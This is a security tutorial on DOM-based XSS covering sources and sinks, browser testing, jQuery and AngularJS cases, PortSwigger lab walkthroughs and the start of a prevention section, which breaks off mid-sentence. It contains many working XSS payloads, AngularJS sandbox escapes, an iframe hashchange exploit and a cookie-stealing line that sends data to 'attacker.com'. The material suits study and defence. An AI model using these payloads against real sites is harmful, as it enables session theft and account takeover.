# DOM-Based XSS

DOM-based cross-site scripting (DOM XSS) is a client-side vulnerability where JavaScript code processes data from an attacker-controllable source and passes it to a dangerous sink that supports dynamic code execution, all without the malicious payload ever being sent to or reflected by the server. Unlike reflected and stored XSS where the vulnerability exists in server-side code, DOM XSS occurs entirely within the browser when client-side JavaScript reads data from sources like the URL (location.search, location.hash, document.URL), processes it unsafely, and writes it to dangerous sinks such as eval(), innerHTML, document.write(), or location.href. The key distinction is that the payload never appears in the HTTP response from the server—instead, vulnerable JavaScript on the page extracts data from the URL or other client-accessible sources and dynamically modifies the DOM, inadvertently executing attacker-controlled code. This makes DOM XSS particularly challenging to detect with traditional web application scanners that only analyze HTTP traffic, as the entire vulnerability exists in client-side code execution paths that require JavaScript analysis and browser-based testing to identify.

The fundamental mechanism: **client-side JavaScript reads from attacker-controllable sources and writes to dangerous sinks**—data flow happens entirely in the browser's Document Object Model.

## What is DOM-Based XSS?

### Understanding DOM-based XSS

**Definition:** A client-side cross-site scripting vulnerability where malicious data flows from a source (attacker-controllable input) through client-side JavaScript to a sink (dangerous function) that executes code, all without server involvement.

**Key characteristics:**
- Entirely client-side (vulnerability in JavaScript, not server code)
- Payload never sent to server in HTTP request
- Not visible in HTTP response from server
- Occurs during client-side DOM manipulation
- Requires JavaScript code analysis to detect
- URL is most common attack vector

**Critical distinction from server-side XSS:**

```
Server-side XSS (Reflected/Stored):
┌─────────────────────────────────────────┐
│ 1. Attacker payload in HTTP request    │
│ 2. Server receives and processes        │
│ 3. Server includes payload in response  │
│ 4. Browser receives malicious HTML      │
│ 5. Browser executes payload             │
└─────────────────────────────────────────┘
Vulnerability: Server-side code
Visible in: HTTP traffic
Detection: HTTP proxy, server logs

DOM-based XSS:
┌─────────────────────────────────────────┐
│ 1. Attacker payload in URL fragment     │
│ 2. Server sends safe HTML (no payload)  │
│ 3. Browser receives clean response      │
│ 4. Client-side JS reads URL             │
│ 5. JS writes data to dangerous sink     │
│ 6. Payload executes in browser          │
└─────────────────────────────────────────┘
Vulnerability: Client-side JavaScript
Invisible in: HTTP traffic to/from server
Detection: Browser DevTools, JS analysis
```

### Sources and sinks

**Sources (attacker-controllable input):**

**URL-based sources (most common):**
```javascript
// Full URL
location.href
// "https://site.com/page?param=value#fragment"

// Query string
location.search
// "?param=value&foo=bar"

// URL fragment (after #)
location.hash
// "#section"

// Pathname
location.pathname
// "/page/subpage"

// Complete URL
document.URL
document.documentURI
// "https://site.com/page?param=value#fragment"

// Base URI
document.baseURI

// Referring page
document.referrer
// "https://previous-site.com/page"
```

**Other sources:**
```javascript
// Cookies
document.cookie

// Web storage
localStorage.getItem('key')
sessionStorage.getItem('key')

// Window name
window.name

// PostMessage
window.addEventListener('message', (event) => {
    // event.data is a source
});

// Web Workers
// Messages from workers

// Form inputs (if processed client-side)
document.getElementById('input').value
```

**Sinks (dangerous output locations):**

**DOM manipulation sinks:**
```javascript
// Write to document
document.write()
document.writeln()

// HTML content manipulation
element.innerHTML
element.outerHTML
element.insertAdjacentHTML()

// DOM domain
document.domain
```

**Script execution sinks:**
```javascript
// Direct code execution
eval(code)

// Timed execution
setTimeout(code, delay)  // When passing string
setInterval(code, delay) // When passing string

// Function constructor
Function(code)
new Function(code)

// Script creation
script.src = url
script.text = code
script.textContent = code
script.innerText = code
```

**Navigation sinks:**
```javascript
// Location manipulation
location = url
location.href = url
location.assign(url)
location.replace(url)

// Window opening
window.open(url)

// Navigation
window.navigate(url)
```

**Event handler sinks:**
```javascript
// Any event handler attribute
element.onclick = handler
element.onerror = handler
element.onload = handler
element.onmouseover = handler
// ... all event handlers
```

**jQuery sinks:**
```javascript
// jQuery selector (vulnerable in older versions)
$(userInput)

// HTML manipulation
$(selector).html(userInput)
$(selector).append(userInput)
$(selector).prepend(userInput)
$(selector).after(userInput)
$(selector).before(userInput)
$(selector).replaceWith(userInput)
$(selector).wrap(userInput)
$(selector).wrapInner(userInput)
$(selector).wrapAll(userInput)

// Attribute manipulation
$(selector).attr(attribute, value)

// Other sinks
add()
animate()
constructor()
has()
index()
init()
insertAfter()
insertBefore()
parseHTML()
replaceAll()
jQuery.parseHTML()
$.parseHTML()
```

### How DOM XSS works

**Attack flow example:**

**Vulnerable code:**
```html
<!DOCTYPE html>
<html>
<head>
    <title>Welcome Page</title>
</head>
<body>
    <h1>Welcome</h1>
    <div id="greeting"></div>
    
    <script>
        // Read name from URL query string
        const urlParams = new URLSearchParams(window.location.search);
        const userName = urlParams.get('name');
        
        // VULNERABLE: Write directly to DOM
        document.getElementById('greeting').innerHTML = 'Hello, ' + userName;
    </script>
</body>
</html>
```

**Normal usage:**
```
URL: https://site.com/welcome?name=Alice

JavaScript execution:
1. Read window.location.search → "?name=Alice"
2. Parse parameters → userName = "Alice"
3. Set innerHTML → "Hello, Alice"

Page displays: Hello, Alice
```

**Malicious usage:**
```
URL: https://site.com/welcome?name=<img src=x onerror=alert(1)>

JavaScript execution:
1. Read window.location.search → "?name=<img src=x onerror=alert(1)>"
2. Parse parameters → userName = "<img src=x onerror=alert(1)>"
3. Set innerHTML → "Hello, <img src=x onerror=alert(1)>"

Browser parses innerHTML:
- Creates <img> element
- src=x fails to load
- onerror event fires
- alert(1) executes

Result: XSS triggered entirely client-side
```

**Why server can't detect it:**

```
HTTP request to server:
GET /welcome?name=<img src=x onerror=alert(1)> HTTP/1.1
Host: site.com

Server response (clean HTML):
HTTP/1.1 200 OK
Content-Type: text/html

<!DOCTYPE html>
<html>
<head><title>Welcome Page</title></head>
<body>
    <h1>Welcome</h1>
    <div id="greeting"></div>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const userName = urlParams.get('name');
        document.getElementById('greeting').innerHTML = 'Hello, ' + userName;
    </script>
</body>
</html>

Observations:
✗ Payload NOT in server's response HTML
✗ Server sends clean, static HTML
✗ Server never processes the 'name' parameter
✓ Vulnerability exists entirely in client-side <script>
✓ Browser executes vulnerable JavaScript after receiving clean HTML
✓ Traditional server-side XSS filters won't catch this
```

**URL fragment advantage for attackers:**

```
Using URL fragment (#) instead of query string (?):

URL with query string:
https://site.com/page?param=<payload>

Browser behavior:
- Sends entire URL to server: GET /page?param=<payload>
- Server sees payload in logs
- WAF/security tools can inspect

URL with fragment:
https://site.com/page#<payload>

Browser behavior:
- Sends to server: GET /page (fragment not included!)
- Server never sees the fragment
- WAF/security tools cannot inspect
- Only accessible client-side via location.hash

Attacker advantage:
✓ Payload invisible to server
✓ No server logs
✓ Bypasses server-side WAF/filters
✓ No HTTP-based detection possible
```

**Example using fragment:**
```html
<script>
// Read from URL fragment
const payload = location.hash.substring(1); // Remove #

// Write to document
document.write('Section: ' + payload);
</script>

Attack URL:
https://site.com/page#<script>alert(1)</script>

Server receives: GET /page (no fragment)
Client-side JS reads: "<script>alert(1)</script>"
Executes: alert(1)
```

## Testing for DOM-Based XSS

### Why DOM XSS is harder to find

**Challenges:**

```
Traditional XSS (Reflected/Stored):
✓ Payload visible in HTTP request
✓ Payload visible in HTTP response
✓ Can test with HTTP proxy (Burp Suite)
✓ Search response for test string
✓ Clear request → response flow

DOM XSS:
✗ Payload may not be in HTTP request body
✗ Payload never in HTTP response
✗ HTTP proxy shows clean HTML
✗ Must analyze client-side JavaScript
✗ Complex data flow through variables
✗ Requires browser-based testing
✗ Need to understand JavaScript execution
```

**Detection requirements:**

```
Must answer:
1. What sources does the page read from?
2. How is source data processed/transformed?
3. Where does data flow in the code?
4. What sinks does data eventually reach?
5. Are there filters/validation in between?
6. Can attacker control the data at the sink?

Traditional scanners cannot:
- Execute JavaScript to trace data flow
- Determine runtime variable values
- Follow complex JavaScript logic
- Test all possible execution paths

Requires:
✓ Browser with DevTools
✓ JavaScript debugging
✓ Manual code review
✓ Dynamic analysis
```

### Manual testing methodology

**Step 1: Identify sources**

**Using browser DevTools:**

```
Chrome DevTools:
1. Open page
2. F12 → Sources tab
3. Ctrl+Shift+F (search all files)
4. Search for: "location"

Look for:
□ location.href
□ location.search
□ location.hash
□ location.pathname
□ document.URL
□ document.referrer
□ document.cookie
□ window.name

Also search for:
□ URLSearchParams
□ location.
□ document.
```

**Example findings:**
```javascript
// File: analytics.js - Line 47
const campaign = new URLSearchParams(location.search).get('utm_campaign');
                                    ↑
                                  SOURCE

// File: main.js - Line 112
const section = location.hash.substring(1);
                ↑
              SOURCE

// File: redirect.js - Line 23
const nextUrl = document.referrer;
                ↑
              SOURCE
```

**Step 2: Identify sinks**

**Search for dangerous functions:**

```
DevTools search terms:
□ "document.write"
□ "innerHTML"
□ "outerHTML"
□ "eval("
□ "setTimeout"
□ "setInterval"
□ "Function("
□ "location ="
□ "location.href"
□ ".html(" (jQuery)
□ ".append(" (jQuery)
□ "$(" (jQuery selector)
```

**Example findings:**
```javascript
// File: welcome.js - Line 89
element.innerHTML = greeting + userName;
        ↑
       SINK

// File: utils.js - Line 156
eval('setLanguage("' + lang + '")');
↑
SINK

// File: navigation.js - Line 201
location.href = redirectUrl;
              ↑
            SINK
```

**Step 3: Trace data flow from source to sink**

**Manual code tracing:**

```javascript
// Example vulnerable code
function updateGreeting() {
    // SOURCE: Read from URL
    const urlParams = new URLSearchParams(location.search);
    const name = urlParams.get('user');  // name is tainted
    
    // DATA FLOW: Process through variables
    const greeting = 'Welcome, ' + name;  // greeting is tainted
    
    const finalMessage = processGreeting(greeting); // finalMessage is tainted
    
    // SINK: Write to DOM
    document.getElementById('message').innerHTML = finalMessage;
}

function processGreeting(msg) {
    return '<div class="greeting">' + msg + '</div>'; // msg stays tainted
}

Data flow trace:
location.search → name → greeting → finalMessage → innerHTML
     (SOURCE)                                         (SINK)

Taint flow: SOURCE → Sink with no sanitization = VULNERABLE
```

**Using JavaScript debugger:**

```
Set breakpoints to trace data:

1. Find source line (e.g., const name = urlParams.get('user'))
2. Click line number to set breakpoint
3. Navigate to page with test payload in URL
4. Debugger pauses at breakpoint
5. Hover over variables to see values
6. Step through code (F10) to follow data flow
7. Watch variable transformations
8. Continue until sink reached
9. Verify payload reaches sink unmodified

Debugger commands:
- F8: Resume
- F10: Step over (next line)
- F11: Step into (enter function)
- Shift+F11: Step out
```

### Testing HTML sinks

**document.write() and innerHTML testing:**

**Step 1: Test with unique identifier**

```
URL test:
https://target-site.com/page?param=xss_test_h8g2k9

JavaScript likely does:
const param = new URLSearchParams(location.search).get('param');
document.write(param);
// or
element.innerHTML = param;
```

**Step 2: Inspect DOM (not page source)**

```
Important: Don't use "View Page Source" (Ctrl+U)
- Shows original HTML from server
- Doesn't include JavaScript DOM modifications

Instead use: DevTools Elements tab (F12)
- Shows live DOM
- Includes JavaScript-generated content
- Updated in real-time

In Elements tab:
1. Ctrl+F to search
2. Type: xss_test_h8g2k9
3. Check where it appears in DOM
4. Note the context:
   - Between tags: <div>xss_test_h8g2k9</div>
   - In attribute: <span data="xss_test_h8g2k9">
   - In script: var x = "xss_test_h8g2k9";
```

**Step 3: Test context-appropriate payload**

**HTML element context:**
```
Found: <div>xss_test_h8g2k9</div>

Test payload:
?param=<img src=x onerror=alert(1)>

Expected result:
<div><img src=x onerror=alert(1)></div>
```

**Inside attribute:**
```
Found: <div data="xss_test_h8g2k9">

Test payload:
?param=" onclick="alert(1)

Expected result:
<div data="" onclick="alert(1)">
```

**Note on URL encoding:**

```
Browser URL encoding behavior:

Chrome/Firefox/Safari:
- Automatically URL-encode location.search
- Automatically URL-encode location.hash
- <script> becomes %3Cscript%3E
- XSS less likely if not decoded

IE11/Legacy Edge:
- Do NOT URL-encode these sources
- <script> stays as <script>
- XSS more likely

Testing:
console.log(location.search);
// Chrome: ?param=%3Cscript%3E
// IE11: ?param=<script>

If URL-encoded at source, XSS unlikely unless:
- Application explicitly decodes (decodeURIComponent)
- Sink processes encoded data in exploitable way
```

### Testing JavaScript execution sinks

**eval(), setTimeout(), Function() testing:**

**Challenge: Input may not appear in DOM**

```
Vulnerable code:
<script>
const lang = new URLSearchParams(location.search).get('lang') || 'en';
eval('setLanguage("' + lang + '")');
</script>

Problem:
- lang value never written to HTML
- Won't find it searching DOM
- Must use JavaScript debugger
```

**Testing methodology:**

**Step 1: Find the source reference**

```
DevTools → Sources → Search all files (Ctrl+Shift+F)
Search for: "location.search"

Found in main.js line 42:
const lang = new URLSearchParams(location.search).get('lang');
```

**Step 2: Set breakpoint**

```
1. Navigate to main.js in Sources tab
2. Find line 42
3. Click line number to set breakpoint (blue highlight)
4. In address bar, navigate to: ?lang=TEST_VALUE
5. Page loads, debugger pauses at breakpoint
```

**Step 3: Follow data flow**

```
At breakpoint (line 42):
const lang = new URLSearchParams(location.search).get('lang');

Hover over variables:
- location.search → "?lang=TEST_VALUE"
- lang → "TEST_VALUE" ✓ Source data captured

Press F10 (step over) repeatedly

Line 45:
eval('setLanguage("' + lang + '")');

Hover over:
- lang → "TEST_VALUE"
- Full string: 'setLanguage("TEST_VALUE")'

This is the SINK - data reaches eval()
```

**Step 4: Test exploitation**

```
Data reaches eval() → Test if can break out

Test payload: ?lang=en");alert(1);//

Debugger trace:
lang = 'en");alert(1);//'

eval() receives:
'setLanguage("en");alert(1);//")'

Executed code:
setLanguage("en");  // Valid call
alert(1);           // Injected code ✓
//")'               // Commented out

Result: alert(1) executes - DOM XSS confirmed
```

**Inspecting variable values:**

```
While paused in debugger:

Method 1: Hover
- Hover mouse over variable name
- Tooltip shows current value

Method 2: Console
- Switch to Console tab (debugger still paused)
- Type variable name
- Press Enter
- See current value

Method 3: Watch expressions
- Right panel → Watch
- Click + to add expression
- Add variable name
- See value update as you step through code

Method 4: Scope panel
- Right panel → Scope
- See all local variables and values
```

### Using DOM Invader

**Burp Suite's browser extension for automated DOM XSS detection:**

**Setup:**
```
1. Open Burp's built-in Chromium browser
2. DOM Invader automatically loaded
3. Navigate to target application
4. DOM Invader works in background
```

**Features:**

```
Automatic testing:
✓ Injects test strings into sources
✓ Monitors all sinks
✓ Tracks data flow automatically
✓ Highlights vulnerable paths
✓ Tests canary values
✓ Identifies exploitable sinks

Visual indicators:
- Red highlights: Vulnerable sinks reached
- Test values automatically injected
- Real-time feedback in browser
- Click to see exploitation details
```

**Workflow:**

```
1. Enable DOM Invader in Burp browser
2. Navigate application normally
3. DOM Invader automatically:
   - Injects canary strings in URL parameters
   - Monitors document.write, innerHTML, eval, etc.
   - Detects when canary reaches dangerous sink
   - Highlights potential vulnerabilities
4. Review findings
5. Click highlighted element for details
6. Get suggested exploitation payload
```

**Advantages over manual testing:**

```
✓ Automatic source injection
✓ Comprehensive sink monitoring
✓ Handles complex JavaScript
✓ Tests minified code
✓ Real-time detection
✓ No need to read/understand code
✓ Finds vulnerabilities in third-party libraries
✓ Tracks data through complex transformations
```

## Common DOM XSS Patterns

### Pattern 1: document.write sink with location.search source

**Classic vulnerable pattern:**

```html
<script>
// Read search parameter
const urlParams = new URLSearchParams(window.location.search);
const query = urlParams.get('search');

// Write to document - VULNERABLE
document.write('<h1>Results for: ' + query + '</h1>');
</script>
```

**Exploitation:**

```
Normal URL:
https://site.com/search?search=laptops

Output:
<h1>Results for: laptops</h1>

Attack URL:
https://site.com/search?search=<script>alert(1)</script>

Output:
<h1>Results for: <script>alert(1)</script></h1>

Result: Script executes
```

**Lab scenario: document.write inside select element**

**More complex vulnerable code:**
```html
<select>
    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const store = urlParams.get('storeId');
        document.write('<option>' + store + '</option>');
    </script>
</select>
```

**Exploitation with context breaking:**

```
Attack payload:
</select><script>alert(1)</script><select>

URL:
?storeId=</select><script>alert(1)</script><select>

Rendered HTML:
<select>
    <script>
        document.write('<option></select><script>alert(1)</script><select></option>');
    </script>
</select>

Becomes:
<select>
    <option></select>
    <script>alert(1)</script>
    <select>
        <option></option>
    </select>
</select>

The </select> closes the select element
Then <script> executes
New <select> prevents broken HTML
```

### Pattern 2: innerHTML sink with location.search source

**Vulnerable code:**

```html
<div id="results"></div>

<script>
const urlParams = new URLSearchParams(window.location.search);
const searchTerm = urlParams.get('q');

// VULNERABLE: innerHTML assignment
document.getElementById('results').innerHTML = 'You searched for: ' + searchTerm;
</script>
```

**Important: innerHTML limitations**

```
innerHTML does NOT execute:
✗ <script> tags
✗ <svg onload> events (modern browsers)

innerHTML DOES execute:
✓ <img> with onerror
✓ <iframe> with src
✓ <body> with onload
✓ <input> with onfocus autofocus
✓ Event handlers on most elements
```

**Exploitation:**

```
Won't work:
?q=<script>alert(1)</script>
Reason: innerHTML strips <script> tags

Won't work (modern browsers):
?q=<svg onload=alert(1)>
Reason: svg onload doesn't fire in innerHTML

Will work:
?q=<img src=x onerror=alert(1)>

URL:
https://site.com/search?q=<img src=x onerror=alert(1)>

Rendered:
innerHTML = 'You searched for: <img src=x onerror=alert(1)>'

Browser creates <img> element
src=x fails
onerror fires
alert(1) executes ✓
```

**Alternative innerHTML payloads:**

```html
<img src=x onerror=alert(1)>
<iframe src=javascript:alert(1)>
<body onload=alert(1)>
<input autofocus onfocus=alert(1)>
<details open ontoggle=alert(1)>
<select autofocus onfocus=alert(1)>
<textarea autofocus onfocus=alert(1)>
<marquee onstart=alert(1)>
<video src=x onerror=alert(1)>
<audio src=x onerror=alert(1)>
```

### Pattern 3: location.href assignment sink

**Vulnerable redirect code:**

```html
<script>
// Read redirect parameter
const urlParams = new URLSearchParams(window.location.search);
const next = urlParams.get('redirect');

if (next) {
    // VULNERABLE: Direct assignment
    location.href = next;
}
</script>
```

**Exploitation with javascript: protocol:**

```
Attack URL:
https://site.com/login?redirect=javascript:alert(document.domain)

JavaScript execution:
next = "javascript:alert(document.domain)"
location.href = "javascript:alert(document.domain)"

Browser interprets javascript: as protocol
Executes: alert(document.domain)
```

**Alternative exploitation:**

```
Data URI:
?redirect=data:text/html,<script>alert(1)</script>

Location becomes:
location.href = "data:text/html,<script>alert(1)</script>"

Browser loads data URI as page
Script executes
```

### Pattern 4: eval() sink with URL parameter

**Highly vulnerable pattern:**

```html
<script>
const urlParams = new URLSearchParams(window.location.search);
const callback = urlParams.get('callback') || 'defaultCallback';

// EXTREMELY DANGEROUS
eval(callback + '()');
</script>
```

**Exploitation:**

```
Normal:
?callback=myFunction
Executes: eval('myFunction()')

Attack:
?callback=alert(1);function x
Executes: eval('alert(1);function x()')

Result:
alert(1) executes
function x() becomes valid syntax (not called)
```

**More sophisticated:**

```
?callback=fetch('//attacker.com?c='+document.cookie);void

Executes:
eval('fetch(\'//attacker.com?c=\'+document.cookie);void()')

Breaks down to:
fetch('//attacker.com?c='+document.cookie);  // Exfiltrate cookie
void()  // Valid syntax, does nothing
```

## DOM XSS in Third-Party Libraries

### jQuery vulnerabilities

**Pattern 1: jQuery attr() sink with location.search source**

**Vulnerable code:**

```html
<a id="backLink" href="#">Back</a>

<script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
<script>
$(function() {
    // Read returnUrl from query string
    const urlParams = new URLSearchParams(window.location.search);
    const returnUrl = urlParams.get('returnUrl');
    
    // VULNERABLE: Set href attribute
    $('#backLink').attr('href', returnUrl);
});
</script>
```

**Exploitation:**

```
Normal URL:
?returnUrl=/previous-page

Result:
<a id="backLink" href="/previous-page">Back</a>

Attack URL:
?returnUrl=javascript:alert(document.domain)

Result:
<a id="backLink" href="javascript:alert(document.domain)">Back</a>

When user clicks "Back" link:
javascript: protocol executes
alert(document.domain) fires
```

**Lab solution:**

```
Full exploit URL:
https://lab.com/page?returnUrl=javascript:alert(document.domain)

Steps:
1. Page loads
2. jQuery reads returnUrl parameter
3. Sets #backLink href to javascript:alert(document.domain)
4. User clicks Back link (or auto-click with JS)
5. Alert executes
6. Lab solved
```

**Pattern 2: jQuery $() selector with location.hash source**

**Classic hashchange vulnerability:**

**Vulnerable code:**

```html
<script src="https://code.jquery.com/jquery-1.8.0.min.js"></script>
<script>
$(window).on('hashchange', function() {
    // Read hash value
    var element = $(location.hash);
    
    // Scroll to element
    element[0].scrollIntoView();
});
</script>
```

**Why vulnerable:**

```
jQuery $() selector in older versions:
- Interprets HTML if input contains HTML tags
- Creates DOM elements from HTML strings
- Executes event handlers on created elements

Normal usage:
URL: https://site.com/page#section1
location.hash = "#section1"
$(location.hash) → Selects element with id="section1"
Scrolls to it

Attack:
URL: https://site.com/page#<img src=x onerror=alert(1)>
location.hash = "#<img src=x onerror=alert(1)>"
$(location.hash) → Interprets as HTML, creates <img> element
onerror event fires
alert(1) executes
```

**Exploitation with iframe:**

**Problem: Need to trigger hashchange event**

```
Simply loading page with hash doesn't trigger hashchange
User must already be on page when hash changes

Solution: Use iframe to trigger hashchange automatically
```

**Exploit code:**

```html
<iframe src="https://vulnerable-site.com/page#" 
        onload="this.src+='<img src=x onerror=alert(1)>'">
</iframe>

Attack flow:
1. Iframe loads: https://vulnerable-site.com/page#
2. onload fires immediately
3. Changes src to: https://vulnerable-site.com/page#<img src=x onerror=alert(1)>
4. Hash change detected by iframe content
5. hashchange event fires in iframe
6. Vulnerable code executes: $(location.hash)
7. jQuery creates <img> element from hash
8. onerror fires
9. alert(1) executes
```

**Lab solution:**

```html
Exploit server body:
<iframe src="https://LAB-ID.web-security-academy.net/#" 
        onload="this.src+='<img src=x onerror=print()>'">
</iframe>

Note: Use print() instead of alert() for PortSwigger labs
(Chrome blocks alert in cross-origin iframes)

Deliver to victim → Lab solved
```

**Pattern 3: jQuery html() and other sinks**

**Multiple jQuery functions are sinks:**

```javascript
// All of these are dangerous with untrusted input
$(selector).html(userInput)      // Sets innerHTML
$(selector).append(userInput)    // Appends HTML
$(selector).prepend(userInput)   // Prepends HTML
$(selector).after(userInput)     // Inserts after
$(selector).before(userInput)    // Inserts before
$(selector).replaceWith(userInput) // Replaces element
$(selector).wrap(userInput)      // Wraps element
```

**Exploitation:**

```javascript
// Vulnerable code
const name = new URLSearchParams(location.search).get('name');
$('#greeting').html('Hello, ' + name);

// Attack
?name=<img src=x onerror=alert(1)>

// Result
$('#greeting').html('Hello, <img src=x onerror=alert(1)>');
// Creates img element, onerror fires
```

### AngularJS vulnerabilities

**AngularJS template injection:**

**How AngularJS works:**

```
AngularJS uses expressions in double curly braces:
{{expression}}

When ng-app attribute present:
<body ng-app>
    <p>Hello {{name}}</p>
</body>

AngularJS evaluates expressions:
{{2+2}} → 4
{{name}} → Evaluates scope.name
{{'test'.toUpperCase()}} → TEST
```

**Vulnerable scenario:**

**Server reflects input into AngularJS context:**

```html
<!DOCTYPE html>
<html ng-app>
<head>
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js"></script>
</head>
<body>
    <h1>Search Results</h1>
    <!-- Server reflects search parameter -->
    <p>You searched for: <?php echo htmlspecialchars($_GET['search']); ?></p>
</body>
</html>
```

**Exploitation:**

```
Normal:
?search=test
Output: You searched for: test

Angle brackets HTML-encoded BUT AngularJS still executes:
?search={{$on.constructor('alert(1)')()}}

Rendered HTML:
<p>You searched for: {{$on.constructor('alert(1)')()}}</p>

AngularJS processing:
1. Finds {{...}} expression
2. Evaluates $on.constructor('alert(1)')()
3. $on.constructor returns Function constructor
4. Function('alert(1)')() creates and executes function
5. alert(1) fires

Result: XSS despite HTML encoding!
```

**Why HTML encoding doesn't prevent it:**

```
HTML encoding converts:
< → &lt;
> → &gt;

But AngularJS expressions use {{}} not <>
{{expression}} doesn't need angle brackets
HTML encoding doesn't affect curly braces

Attack works with:
- No angle brackets needed
- No HTML tags needed
- Pure JavaScript in {{}}
```

**Common AngularJS XSS payloads:**

```javascript
// Basic
{{constructor.constructor('alert(1)')()}}

// Using $on
{{$on.constructor('alert(1)')()}}

// Using $eval
{{$eval.constructor('alert(1)')()}}

// Sandbox escape (older versions)
{{a='constructor';b={};a.sub.call.call(b[a].getOwnPropertyDescriptor(b[a].getPrototypeOf(a.sub),a).value,0,'alert(1)')()}}

// Simple in newer versions if sandbox disabled
{{constructor.constructor('alert(1)')()}}
```

**Lab walkthrough:**

**Scenario: Search with AngularJS, angle brackets encoded**

```html
<!-- Page uses AngularJS -->
<html ng-app>
<script src="angular.js"></script>
<body>
    <h1>Search</h1>
    <!-- Input is HTML-encoded but in AngularJS context -->
    <p>0 results for '<?= htmlspecialchars($_GET['search']) ?>'</p>
</body>
</html>
```

**Solution:**

```
Payload:
{{$on.constructor('alert(1)')()}}

URL:
https://lab.com/search?search={{$on.constructor('alert(1)')()}}

Result:
<p>0 results for '{{$on.constructor('alert(1)')()}}'</p>

AngularJS evaluates expression → alert(1) fires
Lab solved!
```

## DOM XSS Combined with Reflected/Stored Data

### Reflected DOM XSS

**Hybrid vulnerability: Server reflects data + Client-side processing**

**How it differs from pure DOM XSS:**

```
Pure DOM XSS:
- Server never sees/processes payload
- URL fragment (#) commonly used
- Payload only in client-side processing

Reflected DOM XSS:
- Server reflects input into response
- Input visible in HTTP response
- Client-side JavaScript processes reflected data unsafely
- Combines reflected XSS + DOM XSS characteristics
```

**Example vulnerable application:**

**Server-side code (PHP):**
```php
<?php
$searchTerm = $_GET['search'];
?>
<!DOCTYPE html>
<html>
<head><title>Search</title></head>
<body>
    <h1>Search Results</h1>
    
    <!-- Server reflects into JavaScript string -->
    <script>
        var search = "<?php echo addslashes($searchTerm); ?>";
        document.getElementById('results').innerHTML = 'Results for: ' + search;
    </script>
    
    <div id="results"></div>
</body>
</html>
```

**Attack flow:**

```
Step 1: Attacker crafts payload
?search=test\";alert(1);//

Step 2: Server processes
search = "<?php echo addslashes("test\";alert(1);//"); ?>";

addslashes() adds backslash before quotes:
search = "test\\";alert(1);//";

Step 3: Rendered HTML (server response)
<script>
var search = "test\\";alert(1);//";
document.getElementById('results').innerHTML = 'Results for: ' + search;
</script>

Step 4: JavaScript interpretation
JavaScript interprets \\ as single \:
search = "test\";alert(1);//"

Which becomes:
search = "test";
alert(1);
//"

Step 5: Execution
- Variable set to "test"
- alert(1) executes
- // comments out remaining "
```

**Lab scenario: Reflected DOM XSS**

**Vulnerable code pattern:**

```html
<!-- Server reflects into JSON -->
<script>
var data = {"search": "<?= json_encode($_GET['search']) ?>"};
eval('var searchTerm = data.search');
document.write('Results: ' + searchTerm);
</script>
```

**Exploitation:**

```
Payload: \"-alert(1)}//

Server renders:
<script>
var data = {"search": "\"-alert(1)}//"};
eval('var searchTerm = data.search');
document.write('Results: ' + searchTerm);
</script>

eval() executes:
var searchTerm = data.search

But data.search = "\"-alert(1)}//"

Context in eval:
var searchTerm = "\"-alert(1)}//";

Breaks down to:
var searchTerm = "";  // Empty string
-alert(1)  // Evaluates alert
}  // Closes object
//  // Comments rest

Result: alert(1) executes
```

### Stored DOM XSS

**Hybrid: Data stored on server + Client-side unsafe processing**

**Flow:**

```
1. Attacker submits data via HTTP request
2. Server stores data in database (no sanitization)
3. Later, different user requests page
4. Server includes stored data in response
5. Client-side JavaScript reads data
6. JavaScript writes data to dangerous sink
7. XSS executes
```

**Example vulnerable application:**

**Backend storage:**
```javascript
// Node.js - Store comment
app.post('/comment', async (req, res) => {
    const comment = req.body.comment;
    
    // Store raw in database
    await db.comments.insert({
        postId: req.body.postId,
        text: comment,
        author: req.body.author
    });
    
    res.redirect('/post/' + req.body.postId);
});
```

**Frontend display:**
```html
<!-- Server sends JSON data -->
<div id="comments"></div>

<script>
// Fetch comments
fetch('/api/comments?postId=123')
    .then(r => r.json())
    .then(comments => {
        comments.forEach(comment => {
            // VULNERABLE: innerHTML with stored data
            const div = document.createElement('div');
            div.innerHTML = '<strong>' + comment.author + '</strong>: ' + comment.text;
            document.getElementById('comments').appendChild(div);
        });
    });
</script>
```

**Attack:**

```
Step 1: Submit malicious comment
POST /comment
postId=123&author=Attacker&comment=<img src=x onerror=alert(1)>

Step 2: Stored in database
{
  postId: 123,
  author: "Attacker",
  text: "<img src=x onerror=alert(1)>"
}

Step 3: Victim views post
GET /post/123

Step 4: JavaScript fetches comments
fetch('/api/comments?postId=123')
Returns: [{"author":"Attacker","text":"<img src=x onerror=alert(1)>"}]

Step 5: JavaScript processes
div.innerHTML = '<strong>Attacker</strong>: <img src=x onerror=alert(1)>'

Step 6: Browser parses innerHTML
Creates <img> element
onerror fires
alert(1) executes

Result: Stored DOM XSS affecting all viewers
```

**Why it's "DOM XSS" despite storage:**

```
The vulnerability is in client-side code:
✓ JavaScript uses innerHTML (dangerous sink)
✓ No encoding applied client-side
✓ DOM manipulation causes execution

Server is not vulnerable:
✗ Server doesn't process data unsafely
✗ Server returns JSON (not HTML)
✗ Server doesn't execute JavaScript

Fix location: Client-side JavaScript
Must encode data before assigning to innerHTML
```

**Lab walkthrough: Stored DOM XSS**

```html
<!-- Vulnerable page -->
<div id="comments"></div>

<script>
// Load stored comments
loadComments();

function loadComments() {
    fetch('/api/comments')
        .then(r => r.json())
        .then(data => {
            data.forEach(comment => {
                displayComment(comment);
            });
        });
}

function displayComment(comment) {
    const div = document.createElement('div');
    // VULNERABLE
    div.innerHTML = comment.author + ' said: ' + comment.body;
    document.getElementById('comments').appendChild(div);
}
</script>
```

**Solution:**

```
Step 1: Submit comment
Body: <><img src=1 onerror=alert(1)>

Step 2: Stored in database

Step 3: Any user views page
JavaScript fetches and displays comments
innerHTML processes payload
XSS executes

Lab solved!
```

## Prevention Strategies

### Avoid dangerous sinks

**Primary defense: Don't use dangerous APIs**

**Dangerous APIs to avoid:**

```javascript
// Avoid these entirely
eval()                          // Never use
Function()                      // Never use
setTimeout(string)              // Use function instead
setInterval(string)             // Use function instead
execScript()                    // Legacy IE, never use

// Use alternatives for DOM manipulation
element.innerHTML = userInput   // DON'T
element.textContent = userInput // DO - safe, no HTML parsing

document.write(userInput)       // DON'T
element.appendChild(textNode)   // DO - safe
```

**Safe alternatives:**

```javascript
// UNSAFE
element.innerHTML = userInput;

// SAFE
element.textContent = userInput;  // Treats as text, no HTML parsing

// UNSAFE
eval(code);

// SAFE
